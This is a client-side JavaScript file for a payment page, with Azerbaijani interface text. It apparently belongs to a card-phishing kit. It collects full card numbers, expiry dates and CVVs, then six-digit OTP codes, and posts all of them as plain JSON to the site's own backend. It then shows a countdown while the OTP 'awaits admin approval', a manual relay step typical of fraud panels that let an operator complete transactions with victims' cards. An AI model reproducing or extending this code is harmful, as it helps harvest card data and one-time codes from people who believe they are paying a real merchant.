// public/js/payment.js - Ödəniş formu javascript

(function() {
  const app = window.paymentApp = {};

  /* Status çevrə animasiyası */
  app.createCountdownCircle = function(element, durationSeconds) {
    const circle = element.querySelector('circle');
    const text = element.querySelector('text');
    if (!circle) return;

    const radius = circle.r.baseVal.value;
    const circumference = 2 * Math.PI * radius;
    circle.style.strokeDasharray = circumference;
    circle.style.strokeDashoffset = 0;

    let remaining = durationSeconds;
    const updateCircle = () => {
      const percent = remaining / durationSeconds;
      const offset = circumference * (1 - percent);
      circle.style.strokeDashoffset = offset;
      if (text) text.textContent = remaining;
      remaining--;
      if (remaining >= 0) {
        setTimeout(updateCircle, 1000);
      }
    };
    updateCircle();
  };

  /* Kart form submit */
  app.submitCardForm = function(event) {
    event.preventDefault();
    const form = event.target;
    const orderId = form.getAttribute('data-order-id');
    const saveCard = form.querySelector('input[name="saveCard"]')?.checked || false;

    const card = {
      number: form.querySelector('input[name="number"]').value.replace(/\s/g, ''),
      holder: form.querySelector('input[name="holder"]').value,
      expiry: form.querySelector('input[name="expiry"]').value,
      cvv: form.querySelector('input[name="cvv"]').value
    };

    const btn = form.querySelector('button[type="submit"]');
    btn.disabled = true;
    btn.innerHTML = '⏳ Gözləyir...';

    fetch('/api/payment/card/init', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ orderId, card, saveCard })
    })
    .then(r => r.json())
    .then(data => {
      if (data.ok) {
        window.location.href = data.redirect;
      } else {
        alert('Xəta: ' + data.message);
        btn.disabled = false;
        btn.innerHTML = 'Ödənişi Tez Başlat';
      }
    })
    .catch(err => {
      alert('Xəta: ' + err.message);
      btn.disabled = false;
      btn.innerHTML = 'Ödənişi Tez Başlat';
    });
  };

  /* Saxlanılmış kart seçim */
  app.submitSavedCardForm = function(event) {
    event.preventDefault();
    const form = event.target;
    const orderId = form.getAttribute('data-order-id');
    const savedCardId = form.querySelector('select[name="savedCardId"]').value;

    if (!savedCardId) {
      alert('Kart seçin');
      return;
    }

    const btn = form.querySelector('button[type="submit"]');
    btn.disabled = true;
    btn.innerHTML = '⏳ Gözləyir...';

    fetch('/api/payment/saved-card/init', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ orderId, savedCardId })
    })
    .then(r => r.json())
    .then(data => {
      if (data.ok) {
        window.location.href = data.redirect;
      } else {
        alert('Xəta: ' + data.message);
        btn.disabled = false;
        btn.innerHTML = 'Ödənişi Tez Başlat';
      }
    })
    .catch(err => {
      alert('Xəta: ' + err.message);
      btn.disabled = false;
      btn.innerHTML = 'Ödənişi Tez Başlat';
    });
  };

  /* Geri sayım pollingi */
  app.startStatusPolling = function(orderId, interval = 2000) {
    const poll = () => {
      fetch('/api/payment/' + orderId + '/status')
        .then(r => r.json())
        .then(data => {
          if (data.ok) {
            const el = document.getElementById('countdown-circle');
            if (el && data.secondsLeft > 0) {
              app.createCountdownCircle(el, data.secondsLeft);
            }

            if (data.redirect) {
              window.location.href = data.redirect;
            }
          }
          setTimeout(poll, interval);
        })
        .catch(() => setTimeout(poll, interval));
    };
    setTimeout(poll, 1000);
  };

  /* OTP form submit */
  app.submitOtpForm = function(event) {
    event.preventDefault();
    const form = event.target;
    const orderId = form.getAttribute('data-order-id');
    const code = form.querySelector('input[name="otp"]').value.replace(/\D/g, '');

    if (code.length !== 6) {
      alert('OTP kodu 6 rəqəmli olmalıdır');
      return;
    }

    const btn = form.querySelector('button[type="submit"]');
    btn.disabled = true;
    btn.innerHTML = '⏳ Gözləyir...';

    fetch('/api/payment/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ orderId, code })
    })
    .then(r => r.json())
    .then(data => {
      if (data.ok) {
        alert('OTP göndərildi. Admin tərəfindən təsdiqi gözləyir...');
        // Geri sayım və polling başla
        app.startStatusPolling(orderId, 3000);
      } else {
        alert('Xəta: ' + data.message);
        btn.disabled = false;
        btn.innerHTML = 'OTP-ni Göndər';
      }
    })
    .catch(err => {
      alert('Xəta: ' + err.message);
      btn.disabled = false;
      btn.innerHTML = 'OTP-ni Göndər';
    });
  };

  /* Balans ödənişi */
  app.submitBalancePayment = function(event) {
    event.preventDefault();
    const form = event.target;
    const orderId = form.getAttribute('data-order-id');

    const card = {
      number: form.querySelector('input[name="number"]')?.value.replace(/\s/g, '') || '0000000000000000',
      holder: form.querySelector('input[name="holder"]')?.value || 'Balance Payment',
      expiry: form.querySelector('input[name="expiry"]')?.value || '01/99',
      cvv: form.querySelector('input[name="cvv"]')?.value || '000'
    };

    const btn = form.querySelector('button[type="submit"]');
    btn.disabled = true;
    btn.innerHTML = '⏳ Gözləyir...';

    fetch('/api/payment/balance/init', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ orderId, card })
    })
    .then(r => r.json())
    .then(data => {
      if (data.ok) {
        window.location.href = data.redirect;
      } else {
        alert('Xəta: ' + data.message);
        btn.disabled = false;
        btn.innerHTML = 'Balansdan Ödə';
      }
    })
    .catch(err => {
      alert('Xəta: ' + err.message);
      btn.disabled = false;
      btn.innerHTML = 'Balansdan Ödə';
    });
  };

  /* Kart nömrəsi formatlaşdırma */
  app.formatCardNumber = function(value) {
    return value.replace(/\s+/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
  };

  /* Expiry formatlaşdırma */
  app.formatExpiry = function(value) {
    const v = value.replace(/\s+/g, '').replace(/[^\d]/gi, '');
    if (v.length >= 2) {
      return v.slice(0, 2) + '/' + v.slice(2, 4);
    }
    return v;
  };

  /* Kart input listeners */
  if (typeof document !== 'undefined' && document.readyState !== 'loading') {
    const numberInput = document.querySelector('input[name="number"]');
    if (numberInput) {
      numberInput.addEventListener('input', (e) => {
        e.target.value = app.formatCardNumber(e.target.value);
      });
    }

    const expiryInput = document.querySelector('input[name="expiry"]');
    if (expiryInput) {
      expiryInput.addEventListener('input', (e) => {
        e.target.value = app.formatExpiry(e.target.value);
      });
    }
  }
})();
